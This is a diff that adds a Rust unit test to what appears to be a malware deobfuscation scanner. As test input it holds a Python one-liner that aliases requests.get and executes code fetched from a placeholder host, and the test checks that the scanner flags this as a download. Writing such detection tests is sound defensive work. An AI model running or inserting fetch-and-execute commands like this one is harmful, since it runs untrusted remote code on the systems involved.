@@ -11127,6 +11127,38 @@ $urlzip = "https://ps.example/stage.zip""#,
     }
 
     #[test]
+    fn python_requests_module_alias_assigned_get_alias_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"python -c "import requests as rq; fetch = rq.get; exec(fetch('https://py.example/module-assigned-get').text)""#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://py.example/module-assigned-get" && dst.is_none()
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from Python assigned requests module alias get: {:?}",
+            env.traits
+        );
+        let generic_count = env
+            .traits
+            .iter()
+            .filter(|t| {
+                matches!(t, Trait::DownloadInDeobText { src, .. } if src == "https://py.example/module-assigned-get")
+            })
+            .count();
+        assert_eq!(
+            generic_count, 0,
+            "Python assigned requests module alias get URL double-emitted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn python_requests_parenthesized_get_import_alias_emits_structured_download() {
         let mut env = crate::env::Environment::new(&Config::default());
         crate::deob_scan::scan_deob_text(
